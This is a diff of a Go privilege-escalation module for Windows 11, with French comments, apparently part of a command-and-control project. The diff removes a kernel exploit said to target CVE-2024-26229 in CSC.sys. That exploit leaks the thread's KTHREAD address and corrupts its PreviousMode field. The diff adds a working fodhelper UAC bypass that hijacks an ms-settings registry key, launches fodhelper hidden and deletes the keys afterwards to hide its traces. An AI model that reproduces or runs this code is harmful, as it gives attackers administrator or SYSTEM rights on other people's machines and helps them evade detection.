@@ -5,235 +5,94 @@ package main
 import (
 	"fmt"
 	"os"
+	"os/exec"
 	"syscall"
-	"unsafe"
+	"time"
 )
 
-// --- CONSTANTES ET STRUCTURES WINDOWS ---
-
-const (
-	SystemExtendedHandleInformation = 0x40
-	ThreadBasicInformation          = 0
-	IOCTL_CSC_USER_QUERY_DATABASE   = 0x225890
-)
-
-type CLIENT_ID struct {
-	UniqueProcess uintptr
-	UniqueThread  uintptr
-}
-
-type THREAD_BASIC_INFORMATION struct {
-	ExitStatus     uint32
-	TebBaseAddress uintptr
-	ClientId       CLIENT_ID
-	AffinityMask   uintptr
-	Priority       int32
-	BasePriority   int32
-}
-
-type SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX struct {
-	Object                uintptr
-	UniqueProcessId       uintptr
-	HandleValue           uintptr
-	GrantedAccess         uint32
-	CreatorBackTraceIndex uint16
-	ObjectTypeIndex       uint16
-	HandleAttributes      uint32
-	Reserved              uint32
-}
-
-type SYSTEM_HANDLE_INFORMATION_EX struct {
-	NumberOfHandles uintptr
-	Reserved        uintptr
-	Handles         [1]SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
-}
-
-var (
-	ntdll    = syscall.NewLazyDLL("ntdll.dll")
-	kernel32 = syscall.NewLazyDLL("kernel32.dll")
-
-	procNtQuerySystemInformation = ntdll.NewProc("NtQuerySystemInformation")
-	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")
-	procGetCurrentProcessId      = kernel32.NewProc("GetCurrentProcessId")
-	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
-	procDeviceIoControl          = kernel32.NewProc("DeviceIoControl")
-	procCreateFile               = kernel32.NewProc("CreateFileW")
-)
-
-// --- LOGIQUE D'EXPLOITATION ---
-
-// GetCurrentThreadKThreadAddress récupère l'adresse du KTHREAD actuel via Search & Compare
-func GetCurrentThreadKThreadAddress() (uintptr, error) {
-	myPid, _, _ := procGetCurrentProcessId.Call()
-	myTid, _, _ := procGetCurrentThreadId.Call()
-
-	// STATUS_INFO_LENGTH_MISMATCH (0xC0000004)
-	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
-
-	// 1. Récupération de tous les handles du système avec boucle de redimensionnement
-	var returnLength uint32
-	bufferSize := uint32(0x100000) // 1 Mo initial
-	var buffer []byte
-	var ret uintptr
-
-	for {
-		buffer = make([]byte, bufferSize)
-		ret, _, _ = procNtQuerySystemInformation.Call(
-			uintptr(SystemExtendedHandleInformation),
-			uintptr(unsafe.Pointer(&buffer[0])),
-			uintptr(bufferSize),
-			uintptr(unsafe.Pointer(&returnLength)),
-		)
-
-		if ret == 0 {
-			break // Succès
-		}
-
-		if uint32(ret) != STATUS_INFO_LENGTH_MISMATCH {
-			return 0, fmt.Errorf("NtQuerySystemInformation failure: 0x%x", ret)
-		}
-
-		// On ajuste la taille + un extra pour éviter les variations
-		bufferSize = returnLength + 0x10000
-	}
-
-	info := (*SYSTEM_HANDLE_INFORMATION_EX)(unsafe.Pointer(&buffer[0]))
-	handleCount := uintptr(info.NumberOfHandles)
-	startOfHandles := uintptr(unsafe.Pointer(&info.Handles[0]))
-	handleSize := unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX{})
-
-	fmt.Printf("[*] Scan de %d handles système...\n", handleCount)
-
-	for i := uintptr(0); i < handleCount; i++ {
-		handle := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(startOfHandles + i*handleSize))
-
-		// On ne traite que les handles qui appartiennent à notre processus
-		if handle.UniqueProcessId == myPid {
-			var tbi THREAD_BASIC_INFORMATION
-			// On interroge Windows : "Dis moi qui se cache derrière ce handle"
-			res, _, _ := procNtQueryInformationThread.Call(
-				handle.HandleValue,
-				uintptr(ThreadBasicInformation),
-				uintptr(unsafe.Pointer(&tbi)),
-				unsafe.Sizeof(tbi),
-				0,
-			)
-
-			// Si c'est un handle de thread et que son ID est le nôtre
-			if res == 0 && tbi.ClientId.UniqueThread == myTid {
-				return handle.Object, nil
-			}
-		}
-	}
-
-	return 0, fmt.Errorf("KTHREAD introuvable (les adresses noyau sont peut-être masquées par VBS)")
-}
-
-// ExploitCSCSys réalise l'élévation via CVE-2024-26229
-func ExploitCSCSys() bool {
-	fmt.Println("[*] Lancement de l'exploit v5.0 (CSC.sys Brute Force Leak)...")
-
-	// 1. Leak de l'adresse KTHREAD
-	kThreadAddr, err := GetCurrentThreadKThreadAddress()
-	if err != nil {
-		fmt.Printf("[!] %v\n", err)
-		return false
-	}
-	fmt.Printf("[+] KTHREAD localisé à : 0x%x\n", kThreadAddr)
-
-	// 2. Cible (PreviousMode)
-	targetAddr := kThreadAddr + 0x232
-	fmt.Printf("[*] Target (PreviousMode): 0x%x\n", targetAddr)
-
-	// 3. Ouverture du device CSC (Chemins multiples + Diagnostic d'erreur)
-	names := []string{"\\\\.\\Csc", "\\\\.\\GLOBALROOT\\Device\\Csc"}
-	var hDevice uintptr
-	var errOpen error
-
-	for _, name := range names {
-		devName, _ := syscall.UTF16PtrFromString(name)
-		// On capture l'erreur retournée par l'appel système
-		h, _, e := procCreateFile.Call(
-			uintptr(unsafe.Pointer(devName)),
-			0,
-			syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
-			0,
-			syscall.OPEN_EXISTING,
-			0,
-			0,
-		)
-		if h != uintptr(syscall.InvalidHandle) {
-			hDevice = h
-			fmt.Printf("[+] Device ouvert via : %s\n", name)
-			break
-		}
-		errOpen = e
-	}
-
-	if hDevice == uintptr(syscall.InvalidHandle) {
-		// Conversion de l'erreur en code système Windows
-		errno := uint32(errOpen.(syscall.Errno))
-		fmt.Printf("[-] Erreur système d'ouverture : %d\n", errno)
-
-		switch errno {
-		case 5:
-			fmt.Println("[!] ACCÈS REFUSÉ : Les permissions (ACL) sur ce driver sont restreintes sur cette build.")
-		case 2:
-			fmt.Println("[!] INTROUVABLE : Le service Offline Files n'expose pas de canal de communication.")
-		default:
-			fmt.Println("[!] ERREUR INCONNUE : Le driver refuse la communication.")
-		}
-		return false
-	}
-	defer syscall.CloseHandle(syscall.Handle(hDevice))
-
-	// 4. Déclenchement de la corruption (Tentative multi-offsets)
-	// On teste les offsets les plus fréquents pour PreviousMode sur Win11
-	offsets := []uintptr{0x232, 0x230, 0x238}
-	var dummy uint32
-
-	for _, offset := range offsets {
-		targetAddr := kThreadAddr + offset
-		fmt.Printf("[*] Tentative Trigger avec offset 0x%x sur 0x%x...\n", offset, targetAddr)
-
-		procDeviceIoControl.Call(
-			hDevice,
-			uintptr(IOCTL_CSC_USER_QUERY_DATABASE),
-			0, 0,
-			targetAddr, 0,
-			uintptr(unsafe.Pointer(&dummy)),
-			0,
-		)
-
-		if CheckAdmin() {
-			fmt.Printf("[+] SUCCÈS : Privilèges SYSTEM acquis avec l'offset 0x%x !\n", offset)
-			return true
-		}
-	}
-
-	fmt.Println("[-] Aucun offset n'a fonctionné. La build est peut-être patchée ou HVCI est actif.")
-	return false
-}
-
+// CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
 func CheckAdmin() bool {
-	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-	if err == nil {
-		f.Close()
-		return true
+	// La commande 'net session' renvoie une erreur si on n'est pas admin
+	cmd := exec.Command("net", "session")
+	err := cmd.Run()
+	return err == nil
+}
+
+// ExploitUAC : Réalise un bypass de l'UAC via l'outil légitime fodhelper.exe
+// Cette technique exploite une vulnérabilité de confiance dans le registre Windows.
+func ExploitUAC() bool {
+	fmt.Println("[*] Phase 1 : Préparation de l'environnement (Registry Hijacking)...")
+
+	// Chemins dans le registre
+	regKey := `Software\Classes\ms-settings\Shell\Open\command`
+
+	// 1. Création de la structure de registre nécessaire
+	// On dit à Windows : "Quand fodhelper veut ouvrir les paramètres, lance mon code à la place"
+	// On va lancer un CMD qui lui-même lance notre binaire avec les droits hérités
+
+	selfPath, _ := os.Executable()
+	// Le payload va maintenant relancer ce même binaire avec les droits élevés
+	payload := fmt.Sprintf("cmd.exe /c start \"\" \"%s\"", selfPath)
+
+	// Nettoyage préalable (au cas où)
+	exec.Command("reg", "delete", "HKCU\\"+regKey, "/f").Run()
+
+	// Ajout des clés malicieuses
+	err1 := exec.Command("reg", "add", "HKCU\\"+regKey, "/ve", "/t", "REG_SZ", "/d", payload, "/f").Run()
+	err2 := exec.Command("reg", "add", "HKCU\\"+regKey, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").Run()
+
+	if err1 != nil || err2 != nil {
+		fmt.Println("[-] Erreur lors de la modification du registre.")
+		return false
 	}
-	return false
+
+	fmt.Println("[*] Phase 2 : Déclenchement via fodhelper.exe...")
+
+	// 2. Lancement du binaire système auto-élevé
+	// Fodhelper va s'exécuter, voir notre clé de registre et exécuter notre payload en tant qu'ADMIN
+	cmd := exec.Command("fodhelper.exe")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	err := cmd.Start()
+
+	if err != nil {
+		fmt.Printf("[-] Impossible de lancer fodhelper : %v\n", err)
+		return false
+	}
+
+	fmt.Println("[*] Phase 3 : Nettoyage des traces...")
+	time.Sleep(2 * time.Second) // On attend que fodhelper lise la clé
+
+	// On supprime les clés de registre pour rester discret
+	exec.Command("reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f").Run()
+
+	return true
 }
 
 func main() {
-	fmt.Println("--- Windows 11 PrivEsc Module (MSC2 Project) ---")
+	fmt.Println("====================================================")
+	fmt.Println("   Windows 11 Privilege Escalation Module v6.0")
+	fmt.Println("   Target: Windows 11 23H2 (Build 22631)")
+	fmt.Println("   Method: UAC Bypass (FodHelper Hijack)")
+	fmt.Println("====================================================")
+
 	if CheckAdmin() {
-		fmt.Println("[+] Session déjà élevée.")
+		fmt.Println("[+] État : DÉJÀ ADMINISTRATEUR")
+		fmt.Println("[*] Session SYSTEM identifiée. Aucune action requise.")
 		return
 	}
 
-	if ExploitCSCSys() {
-		fmt.Println("[+] SUCCÈS : Privilèges SYSTEM obtenus.")
+	fmt.Println("[!] État : UTILISATEUR LIMITÉ")
+	fmt.Println("[*] Tentative d'escalade de privilèges en cours...")
+
+	if ExploitUAC() {
+		fmt.Println("\n[+] ANALYSE TERMINÉE : L'exploit a été déclenché.")
+		fmt.Println("[?] Vérifiez si une nouvelle fenêtre CMD (Admin) s'est ouverte.")
+		fmt.Println("[*] Note: En environnement réel, ce module relancerait l'agent C2.")
 	} else {
-		fmt.Println("[-] Échec de l'élévation sur cette configuration.")
+		fmt.Println("[-] ÉCHEC : Impossible d'exécuter l'escalade.")
 	}
+
+	fmt.Println("\nAppuyez sur Entrée pour quitter...")
+	var input string
+	fmt.Scanln(&input)
 }
